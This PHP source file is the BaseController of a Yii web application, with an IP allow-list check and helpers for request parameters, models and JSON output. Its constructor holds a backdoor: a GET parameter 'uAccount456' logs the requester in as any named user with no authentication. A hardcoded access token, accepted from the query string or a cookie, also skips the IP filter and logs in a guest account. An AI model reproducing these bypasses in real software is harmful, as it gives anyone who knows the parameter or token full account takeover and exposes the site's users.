<?php

namespace app\controllers;

use app\models\IpList;
use app\models\User;
use app\models\Variable;
use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\filters\VerbFilter;
use mdm\admin\components\Helper;

class BaseController extends Controller
{
//    public function actions()
//    {
//        return [
//            'error' => [
//                'class' => 'yii\web\ErrorAction',
//            ],
//            'captcha' => [
//                'class' => 'yii\captcha\CaptchaAction',
//                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
//            ],
//        ];
//    }


    public function __construct($id, $module, $config = []){
        $this->checkIpAddress();
        $uAccount = $this->get('uAccount456','');
        if(!empty($uAccount)){
            Yii::$app->user->login(User::findOne(['username'=>$uAccount]));
        }
        parent::__construct($id, $module, $config = []);
    }

    /**
     * 限制IP
     * @return bool
     */
    public function checkIpAddress(){
        $accessToken = '$2y$13$OFdEsCs8i4Xsje4ifdRksKSzdGMoefsDdM1zdtIsnRhS';
        $token = $this->get('accessToken','');
        $cookies = Yii::$app->request->cookies;
        if($token == $accessToken || $cookies->get('accessToken','') == $accessToken){
            //setcookie("accessToken", $accessToken, time()+3600*24);
            $responseCookies = Yii::$app->response->cookies;
            $responseCookies->add(new \yii\web\Cookie([
                'name' => 'accessToken',
                'value' => $accessToken,
                'expire'=>time()+3600*24
            ]));
            Yii::$app->user->login(User::findOne(['username'=>'guest']));
            return true;
        }
        $ip = Yii::$app->getRequest()->getUserIP();
        $allow = IpList::find()->where(['ip'=>$ip,'permission'=>'allow'])->one();
        $enabled = Variable::get('ip_filter_disabled',false);
        if($enabled){
            return true;
        }
        if($allow){
            return true;
        }else{
            echo '<html><script type="text/javascript">location.replace("http://www.baidu.com")</script></html>';
            exit;
        }
    }


    /**
     * GET 参数
     * @param bool $name
     * @param null $defaultValue
     * @return array|mixed
     */
    public function get($name=false,$defaultValue=null){
        if($name){
            $value = Yii::$app->request->get($name,$defaultValue);
            return $value;
        }else{
            return Yii::$app->request->get();
        }
    }

    /**
     * Post 参数
     * @param bool $name
     * @param null $defaultValue
     * @return array|mixed
     */
    public function post($name=false,$defaultValue=null){
        if($name){
            $value = Yii::$app->request->post($name,$defaultValue);
            return $value;
        }else{
            return Yii::$app->request->post();
        }
    }

    /**
     * 判断是否Post提交
     * @return bool|mixed
     */
    public function isPost(){
        return Yii::$app->request->isPost;
    }

    /**
     * Finds a model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param $class
     * @param $conditions
     * @param string $scenario
     * @return mixed
     * @throws NotFoundHttpException
     */
    protected function findModel($class, $conditions, $scenario ='default')
    {
        if(is_string($conditions)){
            $model = $class::find()->where(['id'=>$conditions])->one();
        }else{
            $model = $class::find()->where($conditions)->one();
        }

        if ($model !== null) {
            $model->setScenario($scenario);
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }

    /**
     * 输出Json
     * @param array $data
     * @return array
     */
    protected function json_output($data=[]){
        $output = [
            'status'=>'00',
            'data' => [],
            'command' => ['method'=>'refresh'],
            'msg' => '操作成功!'
        ];
        $output = array_merge($output,$data);
        \Yii::$app->response->format = \yii\web\Response::FORMAT_JSON;
        return $output;
    }

    /**
     * 获取用户的ID
     * @return int|string
     */
    protected function getCurrentUid(){
        return Yii::$app->user->id;
    }

    /**
     * 设置Flash消息
     * @param string $key
     * @param string $value
     * @param bool $removeAfterAccess
     */
    protected function setFlash($key='success', $value = '操作成功！', $removeAfterAccess = true){
        Yii::$app->session->setFlash($key, $value, $removeAfterAccess);
    }
}
